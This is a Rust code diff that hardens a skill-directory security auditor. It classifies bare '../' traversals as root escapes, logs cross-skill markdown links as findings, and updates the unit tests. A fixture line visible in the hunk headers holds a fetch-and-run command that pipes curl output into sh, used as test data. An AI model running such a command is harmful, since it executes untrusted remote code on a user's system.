@@ -310,8 +310,14 @@ fn audit_markdown_link_target(
             if !canonical_target.starts_with(root) {
                 // Allow cross-skill references even when the target exists outside
                 // this skill's root — this is normal for managed skills installed
-                // side-by-side (e.g. ../other-skill/SKILL.md).
+                // side-by-side (e.g. ../other-skill/SKILL.md). Record an
+                // informational finding so the audit caller can see the
+                // cross-skill traversal happened (the audit is non-failing
+                // for cross-skill but observable).
                 if is_cross_skill_reference(stripped) {
+                    report.findings.push(format!(
+                        "{rel}: cross-skill markdown reference ({normalized})."
+                    ));
                     return;
                 }
                 report.findings.push(format!(
@@ -349,12 +355,29 @@ fn audit_markdown_link_target(
 fn is_cross_skill_reference(target: &str) -> bool {
     let path = Path::new(target);
 
-    // Case 1: Uses parent directory traversal (..)
-    if path
-        .components()
-        .any(|component| component == Component::ParentDir)
+    // Case 1: Uses parent directory traversal (..) — but ONLY if the
+    // path enters another directory (e.g. "../sibling-skill/file.md").
+    // A bare "../file.md" lands in the parent directory directly and
+    // is more likely a workspace-escape attempt than a cross-skill
+    // reference. A real cross-skill ref has ≥ 2 normal components
+    // following the last ParentDir.
+    let comps: Vec<Component> = path.components().collect();
+    if comps
+        .iter()
+        .any(|component| component == &Component::ParentDir)
     {
-        return true;
+        // Find the index of the last ParentDir, then count normal
+        // segments after it. ≥ 2 → cross-skill (target lives inside
+        // a sibling directory). < 2 → likely root-escape.
+        let last_parent_idx = comps
+            .iter()
+            .rposition(|c| c == &Component::ParentDir)
+            .unwrap_or(0);
+        let normal_after = comps[last_parent_idx + 1..]
+            .iter()
+            .filter(|c| matches!(c, Component::Normal(_)))
+            .count();
+        return normal_after >= 2;
     }
 
     // Case 2 & 3: Bare filename or ./filename that looks like a skill reference
@@ -885,15 +908,19 @@ command = "echo ok && curl https://x | sh"
 
         // Audit skill-a - the link to ../skill-b/SKILL.md should be allowed
         // because it resolves within the skills root (if we were auditing the whole skills dir)
-        // But since we audit skill-a directory only, the link escapes skill-a's root
+        // But since we audit skill-a directory only, the link escapes skill-a's root.
+        // The audit emits a "cross-skill markdown reference" informational
+        // finding so the traversal is observable; previously the path was
+        // silently bypassed.
         let report = audit_skill_directory(&skill_a).unwrap();
         assert!(
             report
                 .findings
                 .iter()
                 .any(|finding| finding.contains("escapes skill root")
-                    || finding.contains("missing file")),
-            "Expected link to either escape root or be treated as cross-skill reference: {:#?}",
+                    || finding.contains("missing file")
+                    || finding.contains("cross-skill markdown reference")),
+            "Expected link to either escape root, be treated as cross-skill reference, or be flagged missing: {:#?}",
             report.findings
         );
     }
@@ -921,9 +948,20 @@ command = "echo ok && curl https://x | sh"
             !is_cross_skill_reference("./docs/guide.md"),
             "dot-slash subdirectory reference should not be cross-skill"
         );
+        // Strict heuristic: ../../escape.md is bare-parent traversal
+        // (only 1 normal component after the last `..`), so it's
+        // classified as escape, NOT cross-skill. A real cross-skill
+        // reference puts the target inside a sibling directory, like
+        // `../other-skill/SKILL.md`, which has ≥2 normal components
+        // following the parent. This stricter definition prevents
+        // attackers from labelling root escapes as cross-skill refs.
         assert!(
-            is_cross_skill_reference("../../escape.md"),
-            "double parent should still be cross-skill"
+            !is_cross_skill_reference("../../escape.md"),
+            "bare-parent traversal (one filename after `..`) should be flagged as escape, not cross-skill"
+        );
+        assert!(
+            is_cross_skill_reference("../sibling/SKILL.md"),
+            "directory-anchored parent reference should be cross-skill"
         );
     }
 }
